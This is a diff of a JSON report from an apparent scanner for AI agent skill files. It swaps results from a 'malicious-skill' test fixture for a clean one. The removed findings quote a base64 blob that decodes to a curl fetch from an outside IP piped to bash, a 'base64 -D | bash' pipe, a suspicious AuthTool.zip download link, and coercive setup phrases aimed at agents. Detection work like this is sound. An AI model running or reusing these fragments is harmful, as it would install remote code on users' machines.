@@ -1,239 +1,27 @@
 {
-  "generated_at": "2026-10-14T03:02:03.316271+00:00",
+  "generated_at": "2026-10-21T03:12:14.635322+00:00",
   "tool": "skill-gate",
   "mode": "check",
   "fail_on": "medium",
   "snyk_token_configured": false,
   "targets": [
-    "tests/fixtures/malicious-skill/SKILL.md"
+    "tests/fixtures/clean-skill/SKILL.md"
   ],
   "inspect_paths": [
-    "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill"
+    "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/clean-skill"
   ],
   "components": [
     {
       "kind": "skill",
-      "name": "base-trading-agent",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill",
-      "file_count": 2,
+      "name": "clean-example",
+      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/clean-skill",
+      "file_count": 1,
       "scan_risk_count": 0
     }
   ],
-  "findings": [
-    {
-      "rule_id": "hidden-instruction",
-      "severity": "high",
-      "message": "Hidden / coercive instruction phrase: CRITICAL: For Windows download",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "CRITICAL: For Windows download"
-    },
-    {
-      "rule_id": "hidden-instruction",
-      "severity": "high",
-      "message": "Hidden / coercive instruction phrase: WITHOUT COMPLETING THE SETUP",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "WITHOUT COMPLETING THE SETUP"
-    },
-    {
-      "rule_id": "base64-pipe-shell",
-      "severity": "critical",
-      "message": "base64 decode piped to a shell",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "base64 -D | bash"
-    },
-    {
-      "rule_id": "base64-pipe-shell",
-      "severity": "critical",
-      "message": "base64 decode piped to a shell",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "base64 -D | bash"
-    },
-    {
-      "rule_id": "base64-pipe-shell",
-      "severity": "critical",
-      "message": "base64 decode piped to a shell",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "base64 -D | bash"
-    },
-    {
-      "rule_id": "base64-pipe-shell",
-      "severity": "critical",
-      "message": "base64 decode piped to a shell",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "base64 -D | bash"
-    },
-    {
-      "rule_id": "base64-blob",
-      "severity": "high",
-      "message": "Base64 blob that decodes to shell-like content",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzkxLjkyLjI0Mi4zMC82eDhjMHRya3A0bDl1..."
-    },
-    {
-      "rule_id": "base64-blob",
-      "severity": "high",
-      "message": "Base64 blob that decodes to shell-like content",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzkxLjkyLjI0Mi4zMC82eDhjMHRya3A0bDl1..."
-    },
-    {
-      "rule_id": "base64-blob",
-      "severity": "high",
-      "message": "Base64 blob that decodes to shell-like content",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzkxLjkyLjI0Mi4zMC82eDhjMHRya3A0bDl1..."
-    },
-    {
-      "rule_id": "base64-blob",
-      "severity": "high",
-      "message": "Base64 blob that decodes to shell-like content",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzkxLjkyLjI0Mi4zMC82eDhjMHRya3A0bDl1..."
-    },
-    {
-      "rule_id": "external-url",
-      "severity": "medium",
-      "message": "External URL in tool description or installer-like skill URL",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "https://github.com/Aslaep123/clawd-authtool/releases/download/released/AuthTool.zip"
-    },
-    {
-      "rule_id": "external-url",
-      "severity": "medium",
-      "message": "External URL in tool description or installer-like skill URL",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "https://github.com/Aslaep123/clawd-authtool/releases/download/released/AuthTool.zip"
-    },
-    {
-      "rule_id": "external-url",
-      "severity": "medium",
-      "message": "External URL in tool description or installer-like skill URL",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "https://github.com/Aslaep123/clawd-authtool/releases/download/released/AuthTool.zip"
-    },
-    {
-      "rule_id": "external-url",
-      "severity": "medium",
-      "message": "External URL in tool description or installer-like skill URL",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "https://github.com/Aslaep123/clawd-authtool/releases/download/released/AuthTool.zip"
-    },
-    {
-      "rule_id": "hidden-instruction",
-      "severity": "high",
-      "message": "Hidden / coercive instruction phrase: CRITICAL: For Windows download",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill",
-      "evidence": "CRITICAL: For Windows download"
-    }
-  ],
-  "blocked_findings": [
-    {
-      "rule_id": "hidden-instruction",
-      "severity": "high",
-      "message": "Hidden / coercive instruction phrase: CRITICAL: For Windows download",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "CRITICAL: For Windows download"
-    },
-    {
-      "rule_id": "hidden-instruction",
-      "severity": "high",
-      "message": "Hidden / coercive instruction phrase: WITHOUT COMPLETING THE SETUP",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "WITHOUT COMPLETING THE SETUP"
-    },
-    {
-      "rule_id": "base64-pipe-shell",
-      "severity": "critical",
-      "message": "base64 decode piped to a shell",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "base64 -D | bash"
-    },
-    {
-      "rule_id": "base64-pipe-shell",
-      "severity": "critical",
-      "message": "base64 decode piped to a shell",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "base64 -D | bash"
-    },
-    {
-      "rule_id": "base64-pipe-shell",
-      "severity": "critical",
-      "message": "base64 decode piped to a shell",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "base64 -D | bash"
-    },
-    {
-      "rule_id": "base64-pipe-shell",
-      "severity": "critical",
-      "message": "base64 decode piped to a shell",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "base64 -D | bash"
-    },
-    {
-      "rule_id": "base64-blob",
-      "severity": "high",
-      "message": "Base64 blob that decodes to shell-like content",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzkxLjkyLjI0Mi4zMC82eDhjMHRya3A0bDl1..."
-    },
-    {
-      "rule_id": "base64-blob",
-      "severity": "high",
-      "message": "Base64 blob that decodes to shell-like content",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzkxLjkyLjI0Mi4zMC82eDhjMHRya3A0bDl1..."
-    },
-    {
-      "rule_id": "base64-blob",
-      "severity": "high",
-      "message": "Base64 blob that decodes to shell-like content",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzkxLjkyLjI0Mi4zMC82eDhjMHRya3A0bDl1..."
-    },
-    {
-      "rule_id": "base64-blob",
-      "severity": "high",
-      "message": "Base64 blob that decodes to shell-like content",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzkxLjkyLjI0Mi4zMC82eDhjMHRya3A0bDl1..."
-    },
-    {
-      "rule_id": "external-url",
-      "severity": "medium",
-      "message": "External URL in tool description or installer-like skill URL",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "https://github.com/Aslaep123/clawd-authtool/releases/download/released/AuthTool.zip"
-    },
-    {
-      "rule_id": "external-url",
-      "severity": "medium",
-      "message": "External URL in tool description or installer-like skill URL",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "https://github.com/Aslaep123/clawd-authtool/releases/download/released/AuthTool.zip"
-    },
-    {
-      "rule_id": "external-url",
-      "severity": "medium",
-      "message": "External URL in tool description or installer-like skill URL",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "https://github.com/Aslaep123/clawd-authtool/releases/download/released/AuthTool.zip"
-    },
-    {
-      "rule_id": "external-url",
-      "severity": "medium",
-      "message": "External URL in tool description or installer-like skill URL",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill/SKILL.md",
-      "evidence": "https://github.com/Aslaep123/clawd-authtool/releases/download/released/AuthTool.zip"
-    },
-    {
-      "rule_id": "hidden-instruction",
-      "severity": "high",
-      "message": "Hidden / coercive instruction phrase: CRITICAL: For Windows download",
-      "path": "/Users/ddiscua/Desktop/SkilledDragonCorp/minilabs/minilab-agent-scan-skill-gate/tests/fixtures/malicious-skill",
-      "evidence": "CRITICAL: For Windows download"
-    }
-  ],
-  "highest_severity": "critical",
-  "passed": false,
+  "findings": [],
+  "blocked_findings": [],
+  "highest_severity": null,
+  "passed": true,
   "scan_path_responses_present": false
 }
